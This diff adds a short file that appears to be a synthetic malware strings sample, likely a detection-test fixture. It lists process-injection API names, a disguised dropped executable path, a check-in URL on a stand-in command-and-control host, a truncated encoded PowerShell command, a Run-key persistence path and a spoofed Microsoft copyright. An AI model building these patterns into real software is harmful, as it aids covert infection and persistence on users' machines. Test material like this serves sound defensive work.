@@ -1,0 +1,15 @@
+MZ........This program cannot be run in DOS mode.
+kernel32.dll
+LoadLibraryA
+GetProcAddress
+VirtualAllocEx
+WriteProcessMemory
+CreateRemoteThread
+C:\Users\Public\AppData\Local\Temp\svc_update.exe
+http://malware-c2.example.net/gate/check.php?id=
+powershell -enc JABjAD0ATgBlAHcA
+HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+QmFzZTY0RW5jb2RlZFBheWxvYWREYXRhVGhhdElzVmVyeUxvbmdBbmRTdXNwaWNpb3Vz
+Copyright (c) Microsoft Corporation. All rights reserved.
+zzzzzzzzzzzzzzz
+2024
